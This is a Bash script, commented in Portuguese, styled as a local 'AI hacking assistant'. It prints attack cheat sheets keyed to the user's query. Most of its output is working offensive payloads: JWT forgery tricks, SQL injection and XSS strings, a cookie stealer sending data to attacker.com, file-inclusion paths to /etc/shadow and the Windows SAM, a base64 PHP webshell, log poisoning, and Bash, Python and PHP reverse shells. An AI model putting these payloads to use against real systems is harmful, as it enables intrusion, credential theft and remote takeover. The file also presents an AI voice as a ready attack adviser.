#!/bin/bash
# AI Hacking Assistant - IA local para hacking
echo "=== AI HACKING ASSISTANT ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <PERGUNTA_OU_COMANDO>"
    echo "Exemplo: $0 'como explorar jwt'"
    echo "Exemplo: $0 'bypass waf'"
    echo "Exemplo: $0 'sql injection mysql'"
    exit 1
fi

QUERY="$1"
echo "Pergunta: $QUERY"

# Base de conhecimento local de hacking
analyze_query() {
    local query=$(echo "$1" | tr '[:upper:]' '[:lower:]')
    
    # JWT Exploits
    if [[ "$query" =~ (jwt|token|bearer) ]]; then
        echo -e "\n🤖 AI SUGERE - JWT EXPLOITS:"
        echo "1. None Algorithm Attack:"
        echo "   ./jwt.sh <token> # Analisa vulnerabilidades"
        echo "   Altere 'alg' para 'none' e remova signature"
        echo ""
        echo "2. Weak Secret Brute Force:"
        echo "   hashcat -m 16500 jwt.txt rockyou.txt"
        echo ""
        echo "3. Key Confusion (RS256→HS256):"
        echo "   Use chave pública como HMAC secret"
        echo ""
        echo "4. Claims Manipulation:"
        echo "   Altere: role, admin, user_id, permissions"
        return
    fi
    
    # WAF Bypass
    if [[ "$query" =~ (waf|bypass|403|401|forbidden) ]]; then
        echo -e "\n🤖 AI SUGERE - WAF BYPASS:"
        echo "1. Headers Bypass:"
        echo "   ./bypass.sh <url> # Testa múltiplos bypasses"
        echo ""
        echo "2. Encoding Bypass:"
        echo "   URL: %2e%2e%2f = ../"
        echo "   Double: %252e%252e%252f"
        echo "   Unicode: %c0%ae%c0%ae%c0%af"
        echo ""
        echo "3. HTTP Methods:"
        echo "   POST, PUT, PATCH, OPTIONS, TRACE"
        echo ""
        echo "4. User-Agent Bypass:"
        echo "   Googlebot, Bingbot, curl/7.68.0"
        return
    fi
    
    # SQL Injection
    if [[ "$query" =~ (sql|injection|sqli|mysql|postgres) ]]; then
        echo -e "\n🤖 AI SUGERE - SQL INJECTION:"
        echo "1. Detection:"
        echo "   ' OR 1=1-- "
        echo "   ' AND 1=2-- "
        echo ""
        echo "2. Union Based:"
        echo "   ' UNION SELECT 1,2,3,4,5-- "
        echo "   ' UNION SELECT user(),database(),version()-- "
        echo ""
        echo "3. Time Based:"
        echo "   MySQL: ' AND SLEEP(5)-- "
        echo "   PostgreSQL: '; SELECT pg_sleep(5)-- "
        echo ""
        echo "4. Error Based:"
        echo "   ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
        echo ""
        echo "5. Automated:"
        echo "   ./exploit.sh <url> # Testa SQLi automaticamente"
        return
    fi
    
    # XSS
    if [[ "$query" =~ (xss|cross.site|javascript) ]]; then
        echo -e "\n🤖 AI SUGERE - XSS EXPLOITS:"
        echo "1. Basic Payloads:"
        echo "   <script>alert(1)</script>"
        echo "   <img src=x onerror=alert(1)>"
        echo "   <svg onload=alert(1)>"
        echo ""
        echo "2. Bypass Filters:"
        echo "   <ScRiPt>alert(1)</ScRiPt>"
        echo "   javascript:alert(1)"
        echo "   ';alert(1);//"
        echo ""
        echo "3. Advanced:"
        echo "   Cookie Stealer: fetch('http://attacker.com?c='+document.cookie)"
        echo "   Keylogger: document.onkeypress=function(e){...}"
        echo ""
        echo "4. Automated:"
        echo "   ./exploit.sh <url> # Testa XSS automaticamente"
        return
    fi
    
    # LFI/RFI
    if [[ "$query" =~ (lfi|rfi|file.inclusion|path.traversal) ]]; then
        echo -e "\n🤖 AI SUGERE - FILE INCLUSION:"
        echo "1. Linux LFI:"
        echo "   ../../../etc/passwd"
        echo "   ../../../etc/shadow"
        echo "   /proc/self/environ"
        echo ""
        echo "2. Windows LFI:"
        echo "   ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        echo "   ..\\..\\..\\windows\\system32\\config\\sam"
        echo ""
        echo "3. PHP Wrappers:"
        echo "   php://filter/convert.base64-encode/resource=index.php"
        echo "   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        echo ""
        echo "4. Log Poisoning:"
        echo "   /var/log/apache2/access.log"
        echo "   User-Agent: <?php system(\$_GET['cmd']); ?>"
        return
    fi
    
    # Reverse Shell
    if [[ "$query" =~ (reverse.shell|shell|backdoor) ]]; then
        echo -e "\n🤖 AI SUGERE - REVERSE SHELLS:"
        echo "1. Bash:"
        echo "   bash -i >& /dev/tcp/IP/PORT 0>&1"
        echo ""
        echo "2. Python:"
        echo "   python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo ""
        echo "3. PHP:"
        echo "   php -r '\$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo ""
        echo "4. Gerador:"
        echo "   ./payload.sh reverse # Gera múltiplos payloads"
        return
    fi
    
    # Privilege Escalation
    if [[ "$query" =~ (privesc|privilege|escalation|root) ]]; then
        echo -e "\n🤖 AI SUGERE - PRIVILEGE ESCALATION:"
        echo "1. Linux Enum:"
        echo "   sudo -l"
        echo "   find / -perm -4000 2>/dev/null"
        echo "   cat /etc/crontab"
        echo ""
        echo "2. SUID Binaries:"
        echo "   find / -user root -perm -4000 -exec ls -ldb {} \\;"
        echo ""
        echo "3. Kernel Exploits:"
        echo "   uname -a"
        echo "   searchsploit kernel"
        echo ""
        echo "4. Services:"
        echo "   ps aux | grep root"
        echo "   netstat -tulpn"
        return
    fi
    
    # Network Scanning
    if [[ "$query" =~ (scan|nmap|port|network) ]]; then
        echo -e "\n🤖 AI SUGERE - NETWORK SCANNING:"
        echo "1. Port Scan:"
        echo "   ./mapper.sh <target> # Scan completo"
        echo "   nmap -sS -T4 --top-ports 1000 <target>"
        echo ""
        echo "2. Service Detection:"
        echo "   nmap -sV -A <target>"
        echo ""
        echo "3. Stealth Scan:"
        echo "   ./stealth.sh <target> # Evasão máxima"
        echo ""
        echo "4. Web Enum:"
        echo "   ./analyzer.sh <url> # Análise web completa"
        return
    fi
    
    # Keycloak
    if [[ "$query" =~ (keycloak|oauth|oidc) ]]; then
        echo -e "\n🤖 AI SUGERE - KEYCLOAK EXPLOITS:"
        echo "1. Análise Completa:"
        echo "   ./keycloak.sh <keycloak_url>"
        echo ""
        echo "2. CVEs Conhecidos:"
        echo "   CVE-2020-1758 (Path traversal)"
        echo "   CVE-2018-14655 (SSRF)"
        echo ""
        echo "3. Credenciais Padrão:"
        echo "   admin:admin, admin:password, keycloak:keycloak"
        echo ""
        echo "4. Realm Enumeration:"
        echo "   /auth/realms/master"
        echo "   /auth/realms/demo"
        return
    fi
    
    # Default response
    echo -e "\n🤖 AI RESPOSTA GERAL:"
    echo "Não encontrei exploit específico para '$QUERY'"
    echo ""
    echo "Ferramentas disponíveis:"
    echo "• ./bypass.sh <url> - WAF bypass"
    echo "• ./exploit.sh <url> - Exploits automáticos"
    echo "• ./analyzer.sh <url> - Análise de sites"
    echo "• ./keycloak.sh <url> - Keycloak exploits"
    echo "• ./mapper.sh <target> - Network mapping"
    echo "• ./stealth.sh <target> - Stealth scanning"
    echo "• ./brute.sh <type> <target> - Brute force"
    echo "• ./payload.sh <type> - Payload generator"
    echo "• ./jwt.sh <token> - JWT analysis"
    echo "• ./sensitive.sh <url> - Data hunter"
    echo "• ./email.sh <email> - Email intelligence"
}

# Executar análise
analyze_query "$QUERY"

# Sugestões contextuais
echo -e "\n🎯 PRÓXIMOS PASSOS SUGERIDOS:"
if [[ "$QUERY" =~ (jwt|token) ]]; then
    echo "1. Analise o token: ./jwt.sh <seu_token>"
    echo "2. Teste bypass: ./bypass.sh <url_protegida>"
elif [[ "$QUERY" =~ (sql|injection) ]]; then
    echo "1. Teste automático: ./exploit.sh <url_vulneravel>"
    echo "2. Análise manual: sqlmap -u <url> --batch"
elif [[ "$QUERY" =~ (scan|recon) ]]; then
    echo "1. Scan stealth: ./stealth.sh <target>"
    echo "2. Análise web: ./analyzer.sh <url>"
else
    echo "1. Reconhecimento: ./analyzer.sh <target_url>"
    echo "2. Scan de rede: ./mapper.sh <target_ip>"
fi

echo -e "\n💡 Dica: Use './tools.sh' para ver todas as ferramentas disponíveis"